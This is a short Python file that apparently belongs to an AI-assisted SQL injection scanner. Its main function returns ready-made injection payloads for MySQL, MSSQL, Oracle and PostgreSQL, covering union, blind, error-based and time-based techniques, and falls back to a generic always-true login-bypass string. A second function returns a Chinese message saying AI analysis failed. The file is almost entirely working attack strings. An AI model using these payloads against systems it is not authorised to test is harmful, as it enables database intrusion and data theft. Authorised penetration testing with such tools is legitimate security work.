def fallback_payload(dbms, vulnerability_type):
    payloads = {
        'mysql': {
            'union': "' UNION SELECT 1,2,3,4,5,6,7,8,9,10-- -",
            'blind': "' AND (SELECT 1 FROM (SELECT(SLEEP(1)))a)-- -",
            'error': "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))-- -",
            'time': "' AND IF(1=1, SLEEP(1), 0)-- -"
        },
        'mssql': {
            'union': "' UNION SELECT 1,2,3,4,5,6,7,8,9,10-- -",
            'blind': "' AND 1=(SELECT IIF(1=1, 1, 0))-- -",
            'error': "' AND 1=CONVERT(int, (SELECT @@version))-- -",
            'time': "' WAITFOR DELAY '00:00:01'-- -"
        },
        'oracle': {
            'union': "' UNION SELECT 1,2,3,4,5,6,7,8,9,10 FROM DUAL-- -",
            'blind': "' AND 1=(CASE WHEN 1=1 THEN 1 ELSE 0 END)-- -",
            'error': "' AND EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><root>x</root>'),'/root') = 1-- -",
            'time': "' AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),10) = 1-- -"
        },
        'postgresql': {
            'union': "' UNION SELECT 1,2,3,4,5,6,7,8,9,10-- -",
            'blind': "' AND 1=(CASE WHEN 1=1 THEN 1 ELSE 0 END)-- -",
            'error': "' AND 1=CAST((SELECT version()) as int)-- -",
            'time': "' AND (SELECT pg_sleep(1))-- -"
        }
    }
    
    dbms = dbms.lower()
    if dbms in payloads and vulnerability_type in payloads[dbms]:
        return payloads[dbms][vulnerability_type]
    
    # 通用fallback
    return "' OR '1'='1-- -"

def fallback_analysis(results):
    return "无法进行AI分析。请手动检查结果以确定潜在的安全问题。"
